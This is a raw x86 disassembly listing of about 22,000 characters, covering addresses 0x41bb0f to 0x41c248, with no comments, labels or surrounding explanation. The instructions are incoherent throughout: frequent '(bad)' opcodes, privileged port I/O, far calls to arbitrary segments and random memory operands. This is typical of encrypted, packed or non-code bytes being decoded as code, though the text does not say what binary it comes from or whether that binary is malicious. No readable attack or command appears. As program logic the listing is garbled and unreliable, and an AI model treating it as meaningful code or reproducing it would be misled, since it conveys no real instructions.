  41bb0f:	adc    cl,0x5a
  41bb12:	add    DWORD PTR [ecx-0xcd3fca9],esp
  41bb18:	lods   eax,DWORD PTR ds:[esi]
  41bb19:	cmp    edi,edi
  41bb1b:	ja     0x41bae6
  41bb1d:	inc    ebp
  41bb1e:	or     ebx,DWORD PTR [edi]
  41bb20:	(bad)  
  41bb21:	icebp  
  41bb22:	mov    WORD PTR [ecx+0x24dc5200],fs
  41bb28:	into   
  41bb29:	jns    0x41baae
  41bb2b:	xlat   BYTE PTR ds:[ebx]
  41bb2c:	xor    DWORD PTR [ebp+0x4a1bdaff],esp
  41bb32:	(bad)  
  41bb33:	cmc    
  41bb34:	ins    BYTE PTR es:[edi],dx
  41bb35:	js     0x41bb55
  41bb37:	lds    ebp,FWORD PTR [ecx+0x50df8149]
  41bb3d:	xchg   ebp,eax
  41bb3e:	into   
  41bb3f:	cdq    
  41bb40:	pop    esp
  41bb41:	in     eax,dx
  41bb42:	(bad)  
  41bb43:	scas   al,BYTE PTR es:[edi]
  41bb44:	adc    al,0x73
  41bb46:	(bad)  
  41bb47:	bound  ecx,QWORD PTR [eax]
  41bb49:	push   edi
  41bb4a:	ja     0x41bade
  41bb4c:	push   es
  41bb4d:	mov    BYTE PTR [ecx-0x65],al
  41bb50:	mov    cl,BYTE PTR [edi-0x1838975a]
  41bb56:	hlt    
  41bb57:	push   esp
  41bb58:	pop    eax
  41bb59:	add    eax,0xc78a28f1
  41bb5e:	(bad)  
  41bb60:	add    bh,BYTE PTR [ebp+0x3f5085eb]
  41bb66:	sub    edi,edx
  41bb68:	dec    esi
  41bb69:	xchg   esp,eax
  41bb6a:	or     BYTE PTR [edx],cl
  41bb6c:	addr16 retf 
  41bb6e:	clc    
  41bb6f:	out    0x9b,al
  41bb71:	outs   dx,DWORD PTR ds:[esi]
  41bb72:	mov    fs,WORD PTR [ecx]
  41bb74:	rol    DWORD PTR [edx],1
  41bb76:	cmp    eax,0xca7bb0e7
  41bb7b:	aad    0xfe
  41bb7d:	pop    edi
  41bb7e:	sub    eax,0xad52a0e7
  41bb83:	mov    WORD PTR [ebx-0x557fe015],ds
  41bb89:	add    eax,0x8c016b17
  41bb8e:	pop    ebp
  41bb8f:	inc    ecx
  41bb90:	aaa    
  41bb91:	mov    cl,0x60
  41bb93:	sub    eax,DWORD PTR [esi+eax*8]
  41bb96:	inc    esp
  41bb97:	adc    DWORD PTR [ebp+eax*1+0x60],esp
  41bb9b:	pop    ebp
  41bb9c:	jge    0x41bb20
  41bb9e:	(bad)  
  41bb9f:	(bad)  
  41bba0:	aas    
  41bba1:	sbb    DWORD PTR [esi],edx
  41bba3:	mov    esi,DWORD PTR gs:[ecx]
  41bba6:	lahf   
  41bba7:	mov    edx,0x22bfbe39
  41bbac:	arpl   bx,si
  41bbae:	int3   
  41bbaf:	ins    DWORD PTR es:[edi],dx
  41bbb0:	mov    DWORD PTR [ecx-0x79],edx
  41bbb3:	scas   al,BYTE PTR es:[edi]
  41bbb4:	mov    ds:0x63f99611,al
  41bbb9:	add    edi,eax
  41bbbb:	cmp    dh,BYTE PTR [edi+0x9]
  41bbbe:	ss xchg esi,eax
  41bbc0:	push   ss
  41bbc1:	lds    esp,FWORD PTR [eax+0x61]
  41bbc4:	sub    DWORD PTR [ecx-0x4dfdc2ef],edx
  41bbca:	loop   0x41bba1
  41bbcc:	in     al,dx
  41bbcd:	xor    al,0xea
  41bbcf:	aaa    
  41bbd0:	sbb    al,ah
  41bbd2:	bound  edi,QWORD PTR [eax+esi*4]
  41bbd5:	(bad)  
  41bbd8:	hlt    
  41bbd9:	add    eax,0x3325cc97
  41bbde:	sub    DWORD PTR [esi],eax
  41bbe0:	fsub   st,st(1)
  41bbe2:	mov    ebp,0x94d7aed4
  41bbe7:	mov    ch,0x1e
  41bbe9:	je     0x41bc0d
  41bbeb:	and    al,0xff
  41bbed:	push   ecx
  41bbee:	xchg   edi,eax
  41bbef:	aam    0xdd
  41bbf1:	xlat   BYTE PTR ds:[ebx]
  41bbf2:	addr16 pop ebx
  41bbf4:	and    eax,0x9c047745
  41bbf9:	add    esp,DWORD PTR [ebx+ebp*1-0x74]
  41bbfd:	shr    edi,cl
  41bbff:	in     eax,dx
  41bc00:	dec    ecx
  41bc01:	pop    ss
  41bc02:	push   es
  41bc03:	pop    ss
  41bc04:	test   BYTE PTR [ebp-0x17],ch
  41bc07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc08:	mov    es,WORD PTR [ebp+0x5ea8d593]
  41bc0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc0f:	ret    
  41bc10:	fistp  WORD PTR [eax-0x5c771040]
  41bc16:	pop    ebp
  41bc17:	sub    eax,0x6951b1bd
  41bc1c:	inc    esp
  41bc1d:	in     eax,0xa0
  41bc1f:	sub    eax,DWORD PTR [eax+eax*1+0x6dd71710]
  41bc26:	enter  0xa01e,0xcb
  41bc2a:	sbb    ah,ch
  41bc2c:	jmp    0xe89d4773
  41bc31:	fisub  DWORD PTR [eax+0x6d]
  41bc34:	imul   edx,esi,0xffffffe4
  41bc37:	xlat   BYTE PTR ds:[ebx]
  41bc38:	mov    eax,0x7bd55add
  41bc3d:	sbb    ah,BYTE PTR [edx+0x34792535]
  41bc43:	push   edi
  41bc44:	pushf  
  41bc45:	sub    eax,0xed2db3a7
  41bc4a:	pusha  
  41bc4b:	pop    ebx
  41bc4c:	mov    al,bl
  41bc4e:	pop    edi
  41bc4f:	mov    ebx,0xb6f4001b
  41bc54:	add    DWORD PTR [esi],ecx
  41bc56:	in     al,dx
  41bc57:	adc    esi,DWORD PTR cs:[ebx-0x7c77424c]
  41bc5e:	cdq    
  41bc5f:	cmc    
  41bc60:	ja     0x41bc6f
  41bc62:	lea    eax,[edx-0x36c7491]
  41bc68:	mov    bl,0xdc
  41bc6a:	(bad)  
  41bc6c:	mov    ds,WORD PTR [edx+0x65147341]
  41bc72:	pop    ds
  41bc73:	and    DWORD PTR [edi],eax
  41bc75:	inc    ebp
  41bc76:	pop    esp
  41bc77:	sub    dh,ah
  41bc79:	sahf   
  41bc7a:	jbe    0x41bc51
  41bc7c:	inc    edx
  41bc7d:	mov    dl,0x2b
  41bc7f:	rcl    BYTE PTR [eax-0x76fdffc6],cl
  41bc85:	shl    DWORD PTR ds:0x2fbfedc2,cl
  41bc8b:	pop    ebx
  41bc8c:	pop    edx
  41bc8d:	mov    edi,edx
  41bc8f:	cmc    
  41bc90:	mov    DWORD PTR [eax+0x35],edx
  41bc93:	(bad)  
  41bc94:	xchg   ebx,eax
  41bc95:	dec    edi
  41bc96:	inc    BYTE PTR [eax]
  41bc98:	lods   eax,DWORD PTR ds:[esi]
  41bc99:	ja     0x41bc1b
  41bc9b:	inc    esp
  41bc9c:	mov    DWORD PTR [ecx],ecx
  41bc9e:	aam    0xa2
  41bca0:	(bad)  
  41bca1:	div    bl
  41bca3:	mov    al,BYTE PTR [esi-0x7]
  41bca6:	leave  
  41bca7:	aam    0x30
  41bca9:	ret    0x3bfd
  41bcac:	add    al,0x92
  41bcae:	pusha  
  41bcaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb0:	jns    0x41bd15
  41bcb2:	frstor [esp+ecx*8]
  41bcb5:	inc    esp
  41bcb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb7:	aam    0x98
  41bcb9:	sbb    ah,bl
  41bcbb:	pop    edi
  41bcbc:	or     eax,0x89d2505e
  41bcc1:	cmp    DWORD PTR [ebx-0x73],esi
  41bcc4:	xchg   ebx,eax
  41bcc5:	mov    gs,ebx
  41bcc7:	ficomp DWORD PTR [esi-0xe]
  41bcca:	fwait
  41bccb:	aad    0x82
  41bccd:	fs aas 
  41bccf:	stc    
  41bcd0:	shl    DWORD PTR [ebp+0x38],0x3e
  41bcd4:	call   0x6f5edc83
  41bcd9:	or     BYTE PTR [eax+0xd],dh
  41bcdc:	(bad)  
  41bcdd:	gs jnp 0x41bcb5
  41bce0:	push   eax
  41bce1:	mov    bl,0x40
  41bce3:	repz mov esi,0x8652fae3
  41bce9:	test   eax,0x4bf8ffbb
  41bcee:	(bad)  
  41bcef:	push   edi
  41bcf0:	push   ds
  41bcf1:	(bad)  
  41bcf2:	push   ecx
  41bcf3:	aad    0x46
  41bcf5:	pusha  
  41bcf6:	test   al,0x42
  41bcf8:	mov    al,ds:0x8964654b
  41bcfd:	and    eax,0x2059cb07
  41bd02:	dec    ebx
  41bd03:	mov    eax,0xf2f8140a
  41bd08:	push   eax
  41bd09:	xchg   esp,eax
  41bd0a:	lods   eax,DWORD PTR ds:[esi]
  41bd0b:	adc    al,0x27
  41bd0d:	adc    DWORD PTR [edi],ebx
  41bd0f:	sbb    BYTE PTR [eax-0x11a4bff5],cl
  41bd15:	retf   0x422b
  41bd18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd19:	add    dh,dl
  41bd1b:	mov    BYTE PTR [edx-0x167e068c],dh
  41bd21:	inc    ebx
  41bd22:	cmp    ax,0xef24
  41bd26:	daa    
  41bd27:	push   cs
  41bd28:	mov    BYTE PTR [edx+ebp*2-0x77fcca67],bh
  41bd2f:	mov    esp,fs
  41bd31:	cld    
  41bd32:	sbb    al,0xa7
  41bd34:	out    0x48,al
  41bd36:	push   ds
  41bd37:	sub    eax,0x6c34be32
  41bd3c:	jb     0x41bd8e
  41bd3e:	jp     0x41bd15
  41bd40:	out    dx,eax
  41bd41:	push   0xffffffdc
  41bd43:	shl    BYTE PTR [eax],1
  41bd45:	ror    esi,0x24
  41bd48:	rol    BYTE PTR ds:0x6997c56d,1
  41bd4e:	pushf  
  41bd4f:	push   esp
  41bd50:	nop
  41bd51:	jge    0x41bd2d
  41bd53:	xchg   edi,eax
  41bd54:	mov    al,0xfd
  41bd56:	(bad)  
  41bd58:	js     0x41bd40
  41bd5a:	mov    edi,0x65d8fb26
  41bd5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd60:	mov    dl,0xb3
  41bd62:	mov    ebx,DWORD PTR [ecx-0x78]
  41bd65:	or     al,0x48
  41bd67:	mul    BYTE PTR [edx]
  41bd69:	imul   edx
  41bd6b:	aad    0xdd
  41bd6d:	addr16 xchg ebx,eax
  41bd6f:	adc    DWORD PTR [ebp-0x76c5fc74],0x59
  41bd76:	push   0xffffffc6
  41bd78:	je     0x41bd6c
  41bd7a:	add    ebp,edi
  41bd7c:	add    eax,DWORD PTR [esi-0x54]
  41bd7f:	ret    0xf0cb
  41bd82:	pop    ds
  41bd83:	mov    ah,0x92
  41bd85:	aam    0x5f
  41bd87:	mov    ch,0x49
  41bd89:	lods   eax,DWORD PTR ds:[esi]
  41bd8a:	sbb    ecx,DWORD PTR [ecx+ecx*4]
  41bd8d:	stos   DWORD PTR es:[edi],eax
  41bd8e:	or     esi,esp
  41bd90:	sub    esp,DWORD PTR [edx+0x3046218]
  41bd96:	sbb    BYTE PTR [ecx-0x618b17c9],ah
  41bd9c:	inc    esp
  41bd9d:	mov    ebp,0x164ae160
  41bda2:	ret    0xa24
  41bda5:	and    DWORD PTR [esi-0x5a],ebp
  41bda8:	sbb    DWORD PTR [ebx+edx*8-0x42],0xffffff89
  41bdad:	add    ah,BYTE PTR [esi+0x19846a38]
  41bdb3:	push   ss
  41bdb4:	mov    bl,ch
  41bdb6:	ins    BYTE PTR es:[edi],dx
  41bdb7:	xor    al,0x6b
  41bdb9:	jae    0x41be35
  41bdbb:	std    
  41bdbc:	mov    edi,0x8db8f205
  41bdc1:	pop    ss
  41bdc2:	les    esi,FWORD PTR [eax+eiz*1-0x7028e1a3]
  41bdc9:	ror    DWORD PTR [ecx+0x76],1
  41bdcc:	cmp    cl,cl
  41bdce:	mov    al,0xd4
  41bdd0:	lods   eax,DWORD PTR ds:[esi]
  41bdd1:	cdq    
  41bdd2:	pop    ebx
  41bdd3:	pop    ebx
  41bdd4:	retf   0xbf2d
  41bdd7:	jg     0x41bd61
  41bdd9:	jns    0x41bdb3
  41bddb:	lds    eax,FWORD PTR [esi+0x70]
  41bdde:	xor    al,0xe2
  41bde0:	rol    BYTE PTR ds:0x5ced92c4,0x61
  41bde7:	loopne 0x41bd82
  41bde9:	push   0x44c6071e
  41bdee:	jecxz  0x41bd8a
  41bdf0:	mov    esi,0xf1d63a52
  41bdf5:	push   esi
  41bdf6:	sahf   
  41bdf7:	arpl   WORD PTR [edx],di
  41bdf9:	daa    
  41bdfa:	cld    
  41bdfb:	in     al,0xcb
  41bdfd:	es pop ds
  41bdff:	xor    eax,0x7d623cda
  41be04:	call   0xea5e:0x4cd54bf1
  41be0b:	sub    eax,0x859f7bf6
  41be10:	mov    dl,0x4d
  41be12:	fsubr  st,st(5)
  41be14:	xchg   ebp,eax
  41be15:	pop    edx
  41be16:	(bad)  
  41be17:	sbb    al,0x9
  41be19:	icebp  
  41be1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be1b:	addr16 jl 0x41be3b
  41be1e:	or     dl,dh
  41be20:	cdq    
  41be21:	pop    ebx
  41be22:	mov    fs,WORD PTR [ebx]
  41be24:	je     0x41bdc7
  41be26:	es cmp al,0x65
  41be29:	jae    0x41be4a
  41be2b:	mov    ds:0xa6764a71,eax
  41be30:	add    BYTE PTR ds:0xcd16d4c4,bl
  41be36:	out    0xa7,eax
  41be38:	ins    DWORD PTR es:[edi],dx
  41be39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be3a:	mov    eax,ds:0x150f8967
  41be3f:	mov    cl,0xd9
  41be41:	(bad)  
  41be42:	fld    QWORD PTR ds:0xd77a0151
  41be48:	jno    0x41bde4
  41be4a:	jns    0x41be37
  41be4c:	mov    dl,0xd
  41be4e:	xor    dl,dl
  41be50:	mov    BYTE PTR ds:0x7856d7fc,dh
  41be56:	ins    DWORD PTR es:[edi],dx
  41be57:	(bad)  [ebp+0x1c572224]
  41be5d:	mov    esp,0x6ef8f5df
  41be62:	add    ebp,DWORD PTR [edx-0x69]
  41be65:	(bad)  
  41be66:	mov    ebp,DWORD PTR ds:0x7801c5a9
  41be6c:	jp     0x41be30
  41be6e:	jecxz  0x41be51
  41be70:	jns    0x41be74
  41be72:	js     0x41be33
  41be74:	ficom  DWORD PTR [esi-0x24]
  41be77:	adc    eax,0x8b1f803a
  41be7c:	shr    DWORD PTR [ebp-0x15b34b12],0x89
  41be83:	test   eax,0x33ee5bb7
  41be88:	ror    BYTE PTR [edx],0x60
  41be8b:	das    
  41be8c:	jp     0x41be71
  41be8e:	mov    ecx,0x52cc9e1a
  41be93:	lods   al,BYTE PTR ds:[esi]
  41be94:	xor    eax,0x2f083342
  41be99:	or     DWORD PTR [esi+0x30],0x2a
  41be9d:	inc    eax
  41be9e:	push   ds
  41be9f:	xchg   ebp,eax
  41bea0:	data16 sub bh,BYTE PTR [esi-0x4ccc9140]
  41bea7:	aam    0x6c
  41bea9:	pop    ebx
  41beaa:	fisttp QWORD PTR [ecx-0x1]
  41bead:	sub    BYTE PTR [edi+0x5c],0x59
  41beb1:	push   ebp
  41beb2:	popa   
  41beb3:	adc    esp,DWORD PTR [ecx]
  41beb5:	add    BYTE PTR [ecx-0x40464e49],dh
  41bebb:	adc    ecx,DWORD PTR [edx+ebp*8]
  41bebe:	cmp    al,0xa6
  41bec0:	sti    
  41bec1:	ja     0x41be9c
  41bec3:	mov    ah,0x8d
  41bec5:	or     ebx,DWORD PTR [eax-0x1788b66a]
  41becb:	xrelease mov BYTE PTR [ebx-0x15],dh
  41becf:	pop    es
  41bed0:	fwait
  41bed1:	sti    
  41bed2:	mul    DWORD PTR [eax]
  41bed4:	cmc    
  41bed5:	add    eax,0xd257ab62
  41beda:	add    al,BYTE PTR [eax]
  41bedc:	imul   ebp,ebp,0xfeaac160
  41bee2:	or     BYTE PTR [esp+ebp*8-0x322be1c4],cl
  41bee9:	and    eax,0xd299fc94
  41beee:	mov    DWORD PTR [edi+0x4c],edi
  41bef1:	in     eax,0x99
  41bef3:	fistp  QWORD PTR [edx+eax*1]
  41bef6:	sub    DWORD PTR [edx],0xaf4c0566
  41befc:	or     al,0x14
  41befe:	enter  0xdbb3,0x41
  41bf02:	cdq    
  41bf03:	xchg   edx,eax
  41bf04:	jp     0x41bec6
  41bf06:	and    cl,BYTE PTR [edi]
  41bf08:	in     al,dx
  41bf09:	(bad)  
  41bf0a:	jmp    0xead4:0x9715ff8b
  41bf11:	lock enter 0x327d,0x1a
  41bf16:	jbe    0x41beed
  41bf18:	push   edx
  41bf19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf1a:	inc    ebp
  41bf1b:	push   0x19f55eee
  41bf20:	xchg   esp,eax
  41bf21:	fabs   
  41bf23:	add    eax,DWORD PTR [edx+eax*2+0x2786ac04]
  41bf2a:	cmp    eax,0x1faab9a6
  41bf2f:	jb     0x41beb9
  41bf31:	shl    BYTE PTR [edx],1
  41bf33:	out    dx,eax
  41bf34:	leave  
  41bf35:	mov    ds:0x2dc707bc,eax
  41bf3a:	jnp    0x41bfb5
  41bf3c:	inc    ebx
  41bf3d:	pushf  
  41bf3e:	jecxz  0x41beca
  41bf40:	fisub  WORD PTR [ebp+0x28b60ea]
  41bf46:	fsub   DWORD PTR [eax+0x39]
  41bf49:	sbb    DWORD PTR [ebx+edx*4],0xffffffe4
  41bf4d:	loopne 0x41bfa8
  41bf4f:	mov    edi,0x2b5d2466
  41bf54:	or     BYTE PTR [ebx+edi*4+0x7f],bl
  41bf58:	mov    ecx,0x65428ddf
  41bf5d:	test   al,0x8f
  41bf5f:	sbb    eax,0xcb5ab889
  41bf64:	xor    al,0xb7
  41bf66:	pop    es
  41bf67:	sbb    eax,0xac9bed86
  41bf6c:	stos   BYTE PTR es:[edi],al
  41bf6d:	aad    0xea
  41bf6f:	push   es
  41bf70:	or     ecx,edi
  41bf72:	test   DWORD PTR [eax],eax
  41bf74:	scas   al,BYTE PTR es:[edi]
  41bf75:	in     eax,dx
  41bf76:	data16 aam 0xfa
  41bf79:	or     al,bh
  41bf7b:	in     al,dx
  41bf7c:	adc    esp,edi
  41bf7e:	arpl   WORD PTR [eax],si
  41bf80:	mov    DWORD PTR ds:0xe9336b0b,eax
  41bf86:	pop    ebp
  41bf87:	fild   QWORD PTR [edx+0x14]
  41bf8a:	or     BYTE PTR [ecx+ebp*8-0x714c8523],bl
  41bf91:	mov    esp,0x6ce85aa
  41bf96:	(bad)  
  41bf97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf98:	test   eax,0x74ac7a4e
  41bf9d:	and    al,0x90
  41bf9f:	gs dec ecx
  41bfa1:	pop    eax
  41bfa2:	sbb    ecx,0x77
  41bfa5:	xchg   edi,eax
  41bfa6:	pusha  
  41bfa7:	lea    edi,[ecx-0x35947aa3]
  41bfad:	sbb    ecx,DWORD PTR [eax-0x3b]
  41bfb0:	mov    bh,0x9
  41bfb2:	fdivr  QWORD PTR ds:0x231fbb7f
  41bfb8:	sub    al,0x4e
  41bfba:	(bad)  
  41bfbb:	call   0x7f60d28c
  41bfc0:	(bad)  
  41bfc1:	repz das 
  41bfc3:	pop    edx
  41bfc4:	push   cs
  41bfc5:	sub    DWORD PTR [edi-0x2b],eax
  41bfc8:	dec    ecx
  41bfc9:	jne    0x41c010
  41bfcb:	in     eax,dx
  41bfcc:	out    0xab,eax
  41bfce:	sub    eax,0xda8b89f4
  41bfd3:	adc    bh,BYTE PTR [ecx]
  41bfd5:	stos   DWORD PTR es:[edi],eax
  41bfd6:	mov    bl,0x5b
  41bfd8:	sub    DWORD PTR [ecx],eax
  41bfda:	push   edx
  41bfdb:	ins    BYTE PTR es:[edi],dx
  41bfdc:	jp     0x41bf7e
  41bfde:	sub    BYTE PTR [edx],ah
  41bfe0:	fiadd  WORD PTR [ebp+0x65880dc2]
  41bfe6:	add    eax,0x66c9e97d
  41bfeb:	pop    eax
  41bfec:	jp     0x41bffd
  41bfee:	dec    edi
  41bfef:	shl    bl,cl
  41bff1:	xchg   ecx,eax
  41bff2:	jne    0x41bfbd
  41bff4:	and    al,BYTE PTR [esi+0x3e]
  41bff7:	jno    0x41bff3
  41bff9:	or     al,0x1f
  41bffb:	cmp    edi,edi
  41bffd:	inc    ebx
  41bffe:	ds mov bl,0xbe
  41c001:	sbb    dl,bl
  41c003:	aam    0xed
  41c005:	mov    ds,WORD PTR ds:[ebx+eax*4-0x50]
  41c00a:	lds    edx,FWORD PTR [edi]
  41c00c:	jge    0x41bfa5
  41c00e:	arpl   WORD PTR [ebx+0x3b6a699e],bx
  41c014:	rol    ebp,1
  41c016:	and    BYTE PTR ss:[eax-0x74],bh
  41c01a:	loope  0x41c030
  41c01c:	clc    
  41c01d:	rcl    DWORD PTR [edi-0x56eb7755],cl
  41c023:	fwait
  41c024:	xchg   ebp,eax
  41c025:	pop    ecx
  41c026:	mov    esp,0x10558866
  41c02b:	and    ah,bl
  41c02d:	mov    ecx,0xb2679c43
  41c032:	inc    ecx
  41c033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c034:	mov    ecx,esp
  41c036:	and    BYTE PTR [eax-0x71754a7b],0x6d
  41c03d:	ja     0x41bfce
  41c03f:	rcl    DWORD PTR [esi],0x2
  41c042:	sub    eax,0x295eb7fa
  41c047:	jmp    DWORD PTR [esi]
  41c049:	add    cl,ah
  41c04b:	xor    al,0xb8
  41c04d:	dec    eax
  41c04e:	jge    0x41bfdb
  41c050:	fcmovbe st,st(2)
  41c052:	pusha  
  41c053:	jmp    0x41bfd8
  41c055:	(bad)  
  41c056:	fistp  DWORD PTR [eax-0x58]
  41c059:	mov    eax,ds:0xb685d558
  41c05e:	pop    ss
  41c05f:	cld    
  41c060:	int    0x35
  41c062:	xlat   BYTE PTR ds:[ebx]
  41c063:	jecxz  0x41bfeb
  41c065:	pop    es
  41c066:	je     0x41c002
  41c068:	shl    al,cl
  41c06a:	mov    al,ds:0xa0368619
  41c06f:	aad    0xbf
  41c071:	cmp    ebp,eax
  41c073:	dec    ebx
  41c074:	pop    ebx
  41c075:	ja     0x41c03a
  41c077:	jne    0x41c008
  41c079:	cdq    
  41c07a:	xor    DWORD PTR [esi],edx
  41c07c:	(bad)  
  41c07e:	jecxz  0x41c0e5
  41c080:	jb     0x41c04a
  41c082:	hlt    
  41c083:	aam    0xd3
  41c085:	repz push 0xa431ab4f
  41c08b:	enter  0xf431,0xe4
  41c08f:	add    eax,0x3a7e02bd
  41c094:	in     eax,dx
  41c095:	cmp    DWORD PTR [edi-0x65],0x45
  41c099:	add    bl,BYTE PTR [eax+0x68]
  41c09c:	jo     0x41c0c3
  41c09e:	push   ss
  41c09f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0a0:	push   ebx
  41c0a1:	pop    eax
  41c0a2:	pop    ds
  41c0a3:	mov    eax,ds:0x1fe9dc0
  41c0a8:	pop    eax
  41c0a9:	xor    ecx,ecx
  41c0ab:	shl    BYTE PTR [edx],cl
  41c0ad:	mov    ebp,0x70c930d0
  41c0b2:	scas   al,BYTE PTR es:[edi]
  41c0b3:	adc    al,0x16
  41c0b5:	lods   eax,DWORD PTR ds:[esi]
  41c0b6:	pop    ecx
  41c0b7:	rcr    DWORD PTR [eax],1
  41c0b9:	or     ebx,DWORD PTR [edi]
  41c0bb:	ds mov ebp,0xced15a21
  41c0c1:	stc    
  41c0c2:	mov    ecx,0x45f949d4
  41c0c7:	jmp    0x400b1f47
  41c0cc:	xchg   ebp,eax
  41c0cd:	sub    ecx,edx
  41c0cf:	sub    al,0xf9
  41c0d1:	test   DWORD PTR [edi],ebp
  41c0d3:	fmul   QWORD PTR [edx-0x782b70d4]
  41c0d9:	(bad)
  41c0dc:	pop    edi
  41c0dd:	mov    ds:0x69898bbd,al
  41c0e2:	nop
  41c0e3:	inc    ebp
  41c0e4:	mov    eax,ds:0x92f03621
  41c0e9:	add    eax,0x2f220756
  41c0ee:	jo     0x41c099
  41c0f0:	mov    ah,0xde
  41c0f2:	pop    ds
  41c0f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0f4:	not    BYTE PTR [esi+edx*1+0x61240f53]
  41c0fb:	cmc    
  41c0fc:	leave  
  41c0fd:	(bad)  
  41c0fe:	push   ecx
  41c0ff:	sub    BYTE PTR [eax-0x61ab4764],cl
  41c105:	pop    esi
  41c106:	stos   DWORD PTR es:[edi],eax
  41c107:	test   BYTE PTR [ecx-0x6dc4743d],0xd2
  41c10e:	lods   al,BYTE PTR ds:[esi]
  41c10f:	popa   
  41c110:	sbb    ch,dh
  41c112:	xchg   ebp,eax
  41c113:	aam    0xac
  41c115:	(bad)  
  41c116:	in     al,dx
  41c117:	cmp    DWORD PTR fs:[ecx-0x18],esp
  41c11b:	in     al,dx
  41c11c:	mov    gs,edi
  41c11e:	popa   
  41c11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c120:	or     cl,BYTE PTR [ebp+0x79]
  41c123:	in     eax,0x98
  41c125:	sub    dl,dl
  41c127:	xlat   BYTE PTR ds:[ebx]
  41c128:	push   ds
  41c129:	mov    ebp,0xbbe68297
  41c12e:	mov    eax,ds:0x60f02a95
  41c133:	rol    esp,cl
  41c135:	adc    esi,ebp
  41c137:	jp     0x41c171
  41c139:	fist   DWORD PTR [esi+0x122b05bb]
  41c13f:	jno    0x41c10a
  41c141:	popf   
  41c142:	cmp    al,0x9a
  41c144:	dec    esi
  41c145:	add    al,0x1f
  41c147:	or     DWORD PTR [edi+0x45],edi
  41c14a:	mov    dh,0xce
  41c14c:	jno    0x41c18e
  41c14e:	adc    DWORD PTR [edi+0x38],eax
  41c151:	(bad)  
  41c152:	sbb    eax,0x861740d4
  41c157:	shl    DWORD PTR [ebx+edi*8-0x9],cl
  41c15b:	jp     0x41c0dd
  41c15d:	lsl    edi,WORD PTR [esi+0xc]
  41c161:	popa   
  41c162:	loope  0x41c188
  41c164:	aas    
  41c165:	jge    0x41c16e
  41c167:	push   ebx
  41c168:	mov    ah,0xfe
  41c16a:	call   0xeb527843
  41c16f:	call   0x67b6:0x91c8bd79
  41c176:	xchg   esi,eax
  41c177:	pop    ebx
  41c178:	mov    bl,dl
  41c17a:	stos   DWORD PTR es:[edi],eax
  41c17b:	rcl    ah,1
  41c17d:	inc    edi
  41c17e:	test   eax,0x27849ed4
  41c183:	push   eax
  41c184:	stos   BYTE PTR es:[edi],al
  41c185:	xlat   BYTE PTR ds:[ebx]
  41c186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c187:	pop    edi
  41c188:	mov    BYTE PTR [ebx],cl
  41c18a:	es and al,0x7c
  41c18d:	inc    esp
  41c18e:	fimul  DWORD PTR [edi]
  41c190:	push   edi
  41c191:	retf   0xe71b
  41c194:	mov    bl,dh
  41c196:	(bad)  
  41c198:	leave  
  41c199:	mov    bl,ch
  41c19b:	push   edi
  41c19c:	mov    BYTE PTR [edi+0x68],bl
  41c19f:	lock in al,0x30
  41c1a2:	or     DWORD PTR [edi+0x77],ecx
  41c1a5:	add    ecx,DWORD PTR [esi-0x23ebcf5]
  41c1ab:	lock das 
  41c1ad:	jae    0x41c1ce
  41c1af:	das    
  41c1b0:	and    al,0x2c
  41c1b2:	xchg   bh,al
  41c1b4:	sbb    BYTE PTR [edi+0x56],al
  41c1b7:	mov    ecx,0x805b4e88
  41c1bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1bd:	add    cl,BYTE PTR [eax]
  41c1bf:	scas   eax,DWORD PTR es:[edi]
  41c1c0:	popf   
  41c1c1:	loopne 0x41c213
  41c1c3:	mov    ds:0x42512d88,al
  41c1c8:	popf   
  41c1c9:	inc    ebx
  41c1ca:	jle    0x41c1d5
  41c1cc:	cwde   
  41c1cd:	and    al,0xbc
  41c1cf:	loop   0x41c1ad
  41c1d1:	mov    esp,DWORD PTR [eax+0x7f]
  41c1d4:	shr    DWORD PTR [ebx-0x6676c186],0xbd
  41c1db:	aad    0xce
  41c1dd:	out    0x7b,eax
  41c1df:	sub    bl,BYTE PTR [edx]
  41c1e1:	jae    0x41c17d
  41c1e3:	jae    0x41c16d
  41c1e5:	jbe    0x41c167
  41c1e7:	fild   DWORD PTR [ebx]
  41c1e9:	stc    
  41c1ea:	xchg   ecx,eax
  41c1eb:	or     BYTE PTR [eax+0x20458d6b],0x8f
  41c1f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1f3:	sub    DWORD PTR [edx],ebp
  41c1f5:	sbb    eax,0x456750ae
  41c1fa:	mov    esp,0x6e3f6ebb
  41c1ff:	cld    
  41c200:	cmp    edx,DWORD PTR [ebp-0x405650a0]
  41c206:	cld    
  41c207:	pop    ds
  41c208:	ret    0xb291
  41c20b:	call   0x6767:0x527a345c
  41c212:	popa   
  41c213:	jmp    0x41c23e
  41c215:	div    DWORD PTR [edx]
  41c217:	pop    esi
  41c218:	mov    ecx,eax
  41c21a:	add    DWORD PTR [edi+0x25876206],edi
  41c220:	cdq    
  41c221:	add    bl,BYTE PTR [eax]
  41c223:	mov    WORD PTR [ecx],?
  41c225:	and    al,0x2b
  41c227:	aaa    
  41c228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c229:	jb     0x41c24a
  41c22b:	sbb    esi,DWORD PTR [ebx+0x11]
  41c22e:	icebp  
  41c22f:	pop    ebx
  41c230:	ret    0x91c5
  41c233:	aad    0xf6
  41c235:	hlt    
  41c236:	push   0x18536463
  41c23b:	ss mov cl,0x45
  41c23e:	fisttp DWORD PTR es:[ecx+0x18677145]
  41c245:	inc    edi
  41c246:	loope  0x41c258
  41c248:	lds    eax,FWORD PTR [edx]
